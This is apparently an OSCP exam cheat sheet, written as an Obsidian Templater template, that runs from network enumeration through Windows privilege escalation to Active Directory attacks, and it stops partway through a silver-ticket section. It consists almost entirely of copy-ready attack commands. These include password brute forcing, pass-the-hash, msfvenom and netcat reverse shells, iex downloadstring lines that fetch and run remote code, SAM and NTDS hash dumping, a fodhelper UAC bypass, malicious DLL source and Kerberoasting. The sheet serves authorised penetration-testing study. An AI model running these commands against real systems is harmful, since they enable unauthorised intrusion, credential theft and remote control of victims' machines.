Comprehensive cheat sheet for OSCP lab and exam. this is with a format for Obsiden template, you can just download and import to use as template with the help of obsiden templater plugin to avoid manual editing of IP address

## 1. Basic Enumeration Tools & Commands
### 1.1 Nmap Commands
```bash
# only open port
nmap <% tp.frontmatter["Target IP"] %> -p- -Pn -T4 -oN nmap-only-open-port-out-<% tp.frontmatter["Target IP"] %>

#Basic-Scan 
sudo nmap -Pn -T4 -sC -sV -O <% tp.frontmatter["Target IP"] %> -oN nmap_Basic_output-<% tp.frontmatter["Target IP"] %>

#Full-Scan
sudo nmap -p- -Pn -T4 -sC -sV -O <% tp.frontmatter["Target IP"] %> -oN nmap_output_detailed-<% tp.frontmatter["Target IP"] %>
sudo nmap -Pn -T4 -sC -sV -O -oA nmap_output_detailed-<% tp.frontmatter["Target IP"] %> <% tp.frontmatter["Target IP"] %> -p <ports>

#UDP-Top-1000
sudo nmap --top-ports 1000 -Pn -T4 -sU -sV <% tp.frontmatter["Target IP"] %> -oN nmap_output_UDP-1000-<% tp.frontmatter["Target IP"] %>
```
---
### 1.2 Enum4linux
```bash
enum4linux -a <% tp.frontmatter["Target IP"] %> -o enum4linux-<% tp.frontmatter["Target IP"] %>-out
```
---
### 1.3 NbtScan
```bash
nbtscan -r <% tp.frontmatter["Target IP"] %>/24
```
---
## 2. Service Enumeration

### 2.1 FTP - 21
#ftp-nmap-scan
```bash
nmap -sC -sV -p21 --script=ftp-anon.nse <% tp.frontmatter["Target IP"] %>
```
#ftp-login
```bash
ftp <% tp.frontmatter["Target IP"] %>
```
---
### 2.2 SSH - 22
```bash
hydra -l username -P passwords.txt <% tp.frontmatter["Target IP"] %> ssh
hydra -L usernames.txt -p password <% tp.frontmatter["Target IP"] %> ssh
crackmapexec ssh <% tp.frontmatter["Target IP"] %> -u username -p passwords
```
---
### 2.3 DNS
```bash
host <% tp.frontmatter["Domain"] %>
host -t mx <% tp.frontmatter["Domain"] %>
host -t txt <% tp.frontmatter["Domain"] %>

for ip in $(seq 1 254); do host 10.10.10.$ip; done | grep -v "not found"  # bash bruteforcer to find domain name

dnsrecon -d <% tp.frontmatter["Domain"] %> -t std                              # standard recon
dnsrecon -d <% tp.frontmatter["Domain"] %> -D <domina-list.txt> -t brt         # bruteforce, hence we provided list

dnsenum <% tp.frontmatter["Domain"] %>

nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151                     # querying domain with a specific IP
```
---
### 2.4 HTTP/HTTPS - 80/443/8080/8443
- View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- check /robots.txt folder
- Look for the hostname and add the relevant one to `/etc/hosts` file.
- Directory and file discovery - Obtain any hidden files which may contain juicy information
```bash
dirsearch -u http://<% tp.frontmatter["Target IP"] %>/ -w /usr/share/wordlists/dirb/big.txt -o <% tp.frontmatter["Target IP"] %>-out.txt
dirsearch -u http://<% tp.frontmatter["Target IP"] %>/ -w /usr/share/wordlists/dirb/common.txt -o <% tp.frontmatter["Target IP"] %>-out.txt
dirsearch -u http://<% tp.frontmatter["Target IP"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <% tp.frontmatter["Target IP"] %>-out.txt
```
- Vulnerability Scanning using nikto: `nikto -h http://<% tp.frontmatter["Target IP"] %>/`
- SSL certificate inspection, this may reveal information like subdomains, usernames…etc
- Default credentials, Identify the CMS or service ans check for default credentials and test them out.
- Bruteforce
```bash
hydra -L users.txt -P password.txt http://<% tp.frontmatter["Target IP"] %>/ http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.
# Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```
- if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
- If /.git folder disclosed publicly
```bash
sudo python3 -m pip install -i https://pypi.org/simple/ GitHacker --break-system-packages
githacker --url http://<% tp.frontmatter["Target IP"] %>/.git/ --output-folder /tmp/gitoutput
```
- API - Fuzz further and it can reveal some sensitive information
```bash
#identifying endpoints using gobuster
gobuster dir -u http://<% tp.frontmatter["Target IP"] %> -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything

#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```
- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
#### WordPress
```bash
# basic usage
wpscan --url <% tp.frontmatter["Target IP"] %> --verbose

# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url <% tp.frontmatter["Target IP"] %> --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add Wpscan API to get the details of vulnerabilties.
```
#### Drupal
```bash
droopescan scan drupal -u http://<% tp.frontmatter["Target IP"] %>
```
#### Joomla
```bash
droopescan scan joomla --url http://<% tp.frontmatter["Target IP"] %>/
sudo python3 joomla-brute.py -u http://<% tp.frontmatter["Target IP"] %>/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce 
```
---
### 2.5 SMB - 139 and 445
#null-session
```bash
smbmap -H <% tp.frontmatter["Target IP"] %> -u null
smbclient -L <% tp.frontmatter["Target IP"] %>
crackmapexec smb <% tp.frontmatter["Target IP"] %> -u '' -p '' --shares # Null user
```
#smbclient
```bash
smbclient //<% tp.frontmatter["Target IP"] %>/<share-name> --no-pass                               # To access the specific share using anonymous login
smbclient //<% tp.frontmatter["Target IP"] %>/<share-name> -U 'username%password'                  # To get access of specific shares  
smbclient //<% tp.frontmatter["Target IP"] %>/<share-name> -U 'oscp.exam/username%password'        # To get access of specific shares if the domain user
smbclient //<% tp.frontmatter["Target IP"] %>/<share-name> -U username --pw-nt-hash 820d6348590813116884101357197052 -W <% tp.frontmatter["ADDomain"] %>
```
To download all content from specific share
```bash
smbclient //<% tp.frontmatter["Target IP"] %>/<share-name> -U 'user%pass
> mask "" 
> recurse 
> prompt 
> mget * 
```
#crackmapexec
```bash
crackmapexec smb <% tp.frontmatter["Target IP"] %> -u '' -p '' --shares                           # Null user
crackmapexec smb <% tp.frontmatter["Target IP"] %> -u 'username' -p 'password' --shares           # user login
crackmapexec smb <% tp.frontmatter["Target IP"] %> -u 'username' -H '<HASH>' --shares             # user login with hash
crackmapexec smb <% tp.frontmatter["Target IP"] %> -u [users.txt] -p [passwords.txt] --shares     # Bruteforce SMB
crackmapexec smb <% tp.frontmatter["Target IP"] %> --pass-pol                                     # To view password policy
```
#smbmap
```bash
smbmap -H <% tp.frontmatter["Target IP"] %> -P 445                         # To list the shares with anonymous login
smbmap -H <% tp.frontmatter["Target IP"] %> -P 445 -R                      # -R for Recrusive
smbmap -H <% tp.frontmatter["Target IP"] %> -P 445 -u user -p pass         # To list share with authenticated user
smbmap -H <% tp.frontmatter["Target IP"] %> -P 445 -u user -p pass -R      # -R for Recrusive
smbmap -u "admin" -p "<NT>:<LM>" -H 10.10.10.100 -P 445                    # Pass-the-Hash
```
---
### 2.6 LDAP - 389/636
```bash
nmap <% tp.frontmatter["Target IP"] %> --script ldap-search.nse -p 389                                     # Nmap for ldap enum 

ldapsearch -h <% tp.frontmatter["Target IP"] %> -p 389 -x -b "dc=domain,dc=com"
ldapsearch -x -H ldap://<% tp.frontmatter["Target IP"] %> -D '' -w '' -b "DC=domain,DC=com" "*"
ldapsearch -H ldap://<% tp.frontmatter["Target IP"] %> -x -s base '' "(objectClass=*)" "*" +

python3 windapsearch.py -d <% tp.frontmatter["ADDomain"] %> -u BINARY\\username -p password --dc-ip <% tp.frontmatter["Target IP"] %> -U -o ouput    #authenticates ldap
python3 windapsearch.py --dc-ip <% tp.frontmatter["Target IP"] %> -u '' -p '' -d <% tp.frontmatter["ADDomain"] %> -U --full -o ~/Output

pip3 install ldapdomaindump
ldapdomaindump --user BINARY\\username -p pass ldap://<% tp.frontmatter["Target IP"] %> --no-json --no-grep -o output
```
---
### 2.7 NFS
```bash
nmap -sV --script=nfs-showmount <% tp.frontmatter["Target IP"] %>
showmount -e <% tp.frontmatter["Target IP"] %>
```
---
### 2.8 SNMP - 161 and 162
#Nmap-UDP-scan
```bash
sudo nmap <% tp.frontmatter["Target IP"] %> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
```
#snmpcheck
```bash
snmpcheck -t <% tp.frontmatter["Target IP"] %> -c public #Better version than snmpwalk as it displays more user friendly
```
#snmpwalk
```bash
snmpwalk -c public -v1 -t 10 <% tp.frontmatter["Target IP"] %> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <% tp.frontmatter["Target IP"] %> 1.3.6.1.4.1.77.1.2.25   #Windows User enumeration
snmpwalk -c public -v1 <% tp.frontmatter["Target IP"] %> 1.3.6.1.2.1.25.4.2.1.2  #Windows Processes enumeration
snmpwalk -c public -v1 <% tp.frontmatter["Target IP"] %> 1.3.6.1.2.1.25.6.3.1.2  #Installed software enumeraion
snmpwalk -c public -v1 <% tp.frontmatter["Target IP"] %> 1.3.6.1.2.1.6.13.1.3    #Opened TCP Ports
```
#snmp-extendend-objects-enumeration
```bash
#Download necessary stuff to deal with SNMP extended objects
sudo apt-get install snmp-mibs-downloader
download-mibs
sudo nano /etc/snmp/snmp.conf (comment line saying "mibs :")

#Enumerate all available communities, the wordlist can be downloaded from SecLists
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <% tp.frontmatter["Target IP"] %> -w 100

#Simple walk
snmpbulkwalk -c public -v2c <% tp.frontmatter["Target IP"] %> > out.txt

#Enumerate extended objects
snmpwalk -v1 -c public <% tp.frontmatter["Target IP"] %>  NET-SNMP-EXTEND-MIB::nsExtendObjects
```
---
### 2.9 SMTP - 25
```bash
nc -nv <% tp.frontmatter["Target IP"] %> 25     # Version Detection
smtp-user-enum -M VRFY -U username.txt -t <% tp.frontmatter["Target IP"] %> # -M means mode, it can be RCPT, VRFY, EXPN

#Sending email with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t user1@test.com -t user2@test.com --from user3@test.com --server <mailserver-IP> --body @body.txt --header "Test" --suppress-data -ap
```
---
### 2.10 Kerberos - 88
```bash
nmap -p 88 <% tp.frontmatter["Target IP"] %> --script krb5-enum-users --script-args krb5-enum-users.realm='<% tp.frontmatter["ADDomain"] %>'

./kerbrute userenum -d <% tp.frontmatter["ADDomain"] %> --dc <% tp.frontmatter["Target IP"] %> <users-filename>                # User enumeration using kerbrute
./kerbrute passwordspray -d <% tp.frontmatter["ADDomain"] %> --dc <% tp.frontmatter["Target IP"] %> <users-filename> <password>   # Password spray using kerbrute
```
---
### 2.11 RPC - 135
```bash
nmap -sR <% tp.frontmatter["Target IP"] %>         # Nmap version scan with RPC scan

rpcclient -U '' -N 10.10.10.192               # RPC Anonymous login
rpcclient -U username //10.10.10.192          # login with user and pass

setuserinfo2 username 23 'new-password'       # if forced pass enabled to any user
rpcclient -U '<% tp.frontmatter["ADDomain"] %>/username%password' <% tp.frontmatter["Target IP"] %> -c 'setuserinfo2 username 23 "new-password"'  # Oneline command
```
#rpcclient-commands
```bash
querydominfo
enumdomusers
enumdomgroups
querygroup 0x200
queryuser fsmith
chgpasswd fsmith Password@123 Password@987   # Change password
createdomgroup newgroup                      # create new group
deletedomgroup newgroup                      # delete new group
querydispinfo                                # To display the all users with description
queryusersgroups 0x44f                       # To list the groups of the specific user
querygroupmem 0x201                          # To list all users in the specific group
enumprivs
getdompwinfo                                 # Get domain password policy info
getusrdompwinfo 0x1f4                        # Get domain user info
lsaenumsid                                   # list SID(s)
lookupnames fsmith                           # fetch the SID of specific user
createdomuser fsmith                         # To create new user (Only it is possible when have privilege)
setuserinfo2 fsmith 24 Password@123
enumalsgroups builtin                        # Enumerate all groups including builtin groups
deletedomuser fsmith
netshareenum                                 # Enumerate the shares
netshareenumall
netsharegetinfo <sharesname>                 # Get the specific share info
enumdomains                                  # To list the domains
```
---
### 2.12 Redis - 6379
```bash
#Reference
https://gist.github.com/carnal0wnage/df7082a56f1d7bc9681ceb3fea65c0fe
https://medium.com/@Kamal_S/hack-the-box-redeemer-solution-536a99df73d2
https://rhynorater.github.io/CVE-2020-13379-Write-Up

redis-cli -h <% tp.frontmatter["Target IP"] %>
redis-cli -h <% tp.frontmatter["Target IP"] %> -p 6379
info         # to information about redis db
select 0     # to select the database
keys *       # list all files in DB
get flag     # downlaod file from redis DB
```
---
### 2.13 RDP - 3389
#nmap-rdp-enum
```bash
nmap --script rdp-enum-encryption -p 3389 <% tp.frontmatter["Target IP"] %>
nmap --script rdp-ntlm-info -p 3389 <% tp.frontmatter["Target IP"] %>
nmap --script rdp* -p 3389 <% tp.frontmatter["Target IP"] %>
```
#rdp-hydra-brutefore
```bahs
hydra -l username -P passwords.txt <% tp.frontmatter["Target IP"] %> rdp 
hydra -L usernames.txt -p password <% tp.frontmatter["Target IP"] %> rdp
```
#rdp-connect-commands
```bash
### FreeRDP
xfreerdp /v:<% tp.frontmatter["Target IP"] %>:3389 /u:user /p:password
xfreerdp /v:10.10.29.40:3389 /u:user /p:password321 /d:<% tp.frontmatter["ADDomain"] %>

### Rdesktop
rdesktop -u user -p password <% tp.frontmatter["Target IP"] %>:3389
rdesktop -u user -p password <% tp.frontmatter["Target IP"] %>:3389 -d <% tp.frontmatter["ADDomain"] %>
```
---
## 3. Pass the Hash

```bash
evil-winrm -i <IP> -u admin -H 4979f29d4cb99845c075c41cf45f24df
xfreerdp /u:jen /d:corp.com /v:192.168.211.72 /pth:<password-hash>
impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
impacket-psexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
```
## 4. File Transfer
### 4.1 Certutil
```bash
#Attacker machine
python3 -m http.server 80

#compromised machine
certutil -urlcache -f http://<% tp.frontmatter["Attacker IP"] %>/<filename> <filename> 
certutil -urlcache -split -f http://<% tp.frontmatter["Attacker IP"] %>/<filename> <filename> 
```
---
### 4.2 Netcat 
```bash
sender      nc -w 3 <IP> 1234 < file.txt
receiver    nc -lvp 1234 > file.txt
```
---
### 4.3 Powershell Module
```bash
#IWR Inbuild powershell tool
iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/<filename> -OutFile <filename>

#powershell download and import
iex(new-object net.webclient).downloadstring('http://<% tp.frontmatter["Attacker IP"] %>/<filename>')
```
---
### 4.4 Impacket SMB Server
```bash
# Attacker Machine Impacket-smbserver
impacket-smbserver -smb2support smb ./
impacket-smbserver -smb2support -username admin -password admin smb ./ 

# Compromised victim Machine
copy \\<% tp.frontmatter["Attacker IP"] %>\smb\<filename> <filename>          # download
copy <filename> \\<% tp.frontmatter["Attacker IP"] %>\smb                     # Upload

# mounting shared folder on compromised machine
net use m: \\<% tp.frontmatter["Attacker IP"] %>\smb /user:admin admin
copy mimikatz.log m:\
```
---
## 5. Pivoting and Port Forwarding
### 5.1 Chisel and ProxyChains
#To-start-a-server On Attacker Machine:
```bash
# Attacker Machine to Start chisel Server
chisel server --reverse --socks5               # start the server with default listening port 8080
chisel server -p 8000 --reverse --socks5       # start the server with custom port using -p flag
```
Before, we should configure the proxychains configuration file "*/etc/proxychains4.conf*"
```
socks5  0.0.0.0 1080
```
#To-connect-the-serve On Target Machine:
```bash 
chisel client <% tp.frontmatter["Attacker IP"] %>:8080 R:1080:socks
chisel client <% tp.frontmatter["Attacker IP"] %>:8080 0.0.0.0:9999:<% tp.frontmatter["Attacker IP"] %>:9999
```
---
### 5.2 Ligolo-ng

**Ligolo-ng building agent and proxy**
```bash
# Build for Linux
$ go build -o agent cmd/agent/main.go
$ go build -o proxy cmd/proxy/main.go

# Build for Windows
$ GOOS=windows go build -o agent.exe cmd/agent/main.go
$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```

**Setup Ligolo-ng** - need to create a tun interface on the attacker machine:
```bash
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
```
 
 **Running Ligolo-ng proxy server** - Start the _proxy_ server on the attacker machine (default port 11601):
```bash
./proxy -autocert # Automatically request LetsEncrypt certificates
```

**Using Ligolo-ng** - Start the _agent_ on your target (victim) computer (no privileges are required!):
```bash
./agent -connect <attacker IP>:11601
```

After the connection, on the proxy server (attacker machine) will get the session info like below
```bash
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

Display the network configuration of the agent using the `ifconfig` command:
Add a route on the _proxy/relay_ server (attacker machine) to the _10.10.100.0/24_ (internal network) _agent_ network.
_Linux_:
```shell
sudo ip route add 10.10.100.0/24 dev ligolo
```

Add port redirection for reach the victim machine to attacker machine in proxy server (attacker machine)
```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```
---
## 6. Windows Privilege Escalation
### 6.1 Basic enumeration
#Windows-Version-and-Configuration
```bash
systeminfo
wmic qfe                                                        # Extract patches and updates
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%     # info about architecture

set                                                             # list all env variable in cmd
Get-ChildItem Env: | ft Key,Value                               # list all env variable in powershell

wmic logicaldisk get caption || fsutil fsinfo drives                                           # list all drivers in cmd 
wmic logicaldisk get caption,description,providername                                          # list all drivers in cmd 
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root   # list all drivers in powershell
```
#User-Enumeration
```bash
whoami
echo %USERNAME% || whoami
$env:username

#List current user privilege and groups
whoami /priv
whoami /groups
whoami /all

#List all users and List logon requirements; useable for bruteforcing
net users
net accounts
Get-ChildItem C:\Users -Force | select Name
Get-LocalUser | ft Name,Enabled,LastLogon

#Get Details about a user
net user administrator
net user joe /domain          # If the user is associated with domain 
```

#Group-Enumeration
```bash
#List all local groups
net localgroup
Get-LocalGroup | ft Name

#Get details about a group (i.e. administrators)
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

#Networks, #Applications and #Process Enumeration
```bash
# Network info
ipconfig /all
route print
netstat -ano

# Installed apps (32 bit) 
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Installed apps (64 bit) 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Get details about running processes
Get-Process
Get-Process | select name,path
```
#Files, #services and #History Enumeration
```bash
# search files recursively
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# get permissions
icacls auditTracker.exe

# get service info
Get-Service * | Select-Object Displayname,Status,ServiceName,Can*
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#Search history
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```
---
### 6.2 Exploiting SeImpersonatePrivilege
- Command to verify `whoami /priv`
```bash
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
PrintSpoofer64.exe -c "C:\temp\nc.exe <lhost> <lport> c:\windows\system32\cmd.exe -e cmd"

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe <lhost> <lport>"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe /c C:\temp\nc.exe -e cmd.exe <lhost> <lport> -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```
---
### 6.3 Exploiting SeBackupPrivilege
- Command to verify `whoami /priv`  https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```bash
# Making temp directory
mkdir C:\temp

# Save SAM and SYSTEM file into temp directory
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
#In-Domain-Controller
- write the below contents in to user.dsh file
```bash
set context persistent nowriters
add volume c: alias <CHANGE-USER-NAME>
create
expose %<CHANGE-USER-NAME>% z:
```
- Convert the file info dos format
```bash
unix2dos user.dsh
```
- Dumping the ntds.dit and SYSTEM file
```bash
#upload user.dsh
diskshadow /s user.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system c:\Temp\system
```
- #Retrieving hashes from SAM and SYSTEM files
```bash
impacket-secretsdump -system SYSTEM -sam SAM local
impacket-secretsdump -ntds ntds.dit -system system local
pypykatz registry --sam sam system
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt
```
---
### 6.4 Always Installed Elevated
```bash
#For checking, it should return 1 or 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi

#Execute and get shell
msiexec /quiet /qn /i reverse.msi
```
---
### 6.5 Scheduled Tasks
```bash
#checking information about scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Permission check - Writable means exploitable!
icalcs "path"
```
---
### 6.6 SYSTEM and SAM Files
- checking the following folder for SAM and SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

#Regex, first go to c:
dir /s SAM
dir /s SYSTEM
```
- Retrieving hashes from SAM and SYSTEM files
```bash
impacket-secretsdump -system SYSTEM -sam SAM local
pypykatz registry --sam sam system
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt
```
---
### 6.7 User Account Control (UAC) Bypass
 **Enumeration**
```bash
# Command to check that user in administrators group and integrity level
whoami /groups

# User should in local Administrators group and Integrity level with Medium to Perform UAC bypass
BUILTIN\Administrators                                        Alias            S-1-5-32-544
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```
**Exploitation** - _fodhelper.exe_
```bash
where fodhelper.exe     
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command                                     #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ        #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe            #on your kali
certutil -urlcache -split -f http://<IP>/shell.exe C:\Windows\Tasks\backup.exe                   #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80                                                                                      #on your kali
C:\Windows\system32>fodhelper.exe                                                                #victim machine
```
---
### 6.8 Unquoted Service Path
- Enumerate the services of unquoted service path:
```bash
wmic service get name,pathname,displayname,startmode |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
- Get the details about service:
```bash
sc qc <service-name>
sc query <service-name>

# The command to check the permission of the folder
icalcs "<path>"
```

```bash
# Create the revershell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

# copy the reverse shell binary into the folder and start the service
sc start <service>   # if the service is manual start mode
shutdown /r /t 0     # if the service is auto start mode
# wait for the shell on attacker machine
```
---
### 6.9 Service Binary Hijacking
- Enumerate the services
```bash
# Enumerate all services or Identify services from winpeas:
wmic service get name,startname,pathname | findstr /r /v /i /c:system32

# Get the details about service:
sc qc <service-name>
sc query <service-name>

# The command to check the permission of the binary
icalcs "<Binary-path>" 

# Create the revershell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

# copy the reverse shell binary into the folder as same name and start the service
sc start <service>   # if the service is manual start mode
shutdown /r /t 0     # if the service is auto start mode
# wait for the shell on attacker machine
```
---
### 6.10 DLL Hijacking
```bash
# find missing DLL 
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
---
### 6.11 Registry Key - Usernames and Passwords
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 

# SNMP parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 

# Putty clear text proxy credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 

# VNC Passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"

reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```
---
### 6.12 Looting Sensitive Information
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

# In all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*

c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini

# search files recursively
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
---
## 7. Active Directory
### 7.1 AS Response Roasting
- **Retrieving TGT**
```bash
# Impacket
impacket-GetNPUsers BINARY.local/ -no-pass -usersfile users.txt 2>/dev/null
impacket-GetNPUsers spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.104.142
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

# Rubeus
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```
- **Password Cracking**
```bash
# HashCat to crack the hash
hashcat -m 18200 -a 0 <AS_REP_responses_file> /usr/share/wordlists/rockyou.txt

# John to crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt <AS_REP_responses_file>
```
### 7.2 Kerberosting
- **Retrieving TGS**
```bash
# Impacket
impacket-GetUserSPNs domain.com/<username>:<password> -dc-ip 192.168.134.135
impacket-GetUserSPNs domain.com/<username>:<password> -dc-ip 192.168.134.135 -request
impacket-GetUserSPNs domain.com/<username>:<password> -dc-ip 192.168.134.135 -request-user SQLService

# Rubeus

.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

# Powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```
- **Password Cracking**
```bash
# HashCat to crack the hash
hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt

# John to crack the hash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <AS_REP_responses_file>
```
### 7.3 Silver Ticket
-  **Attacking with [Impacket](https://github.com/SecureAuthCorp/impacket)_**
```bash
# To generate the TGS with NTLM
imapcket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
imapcket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
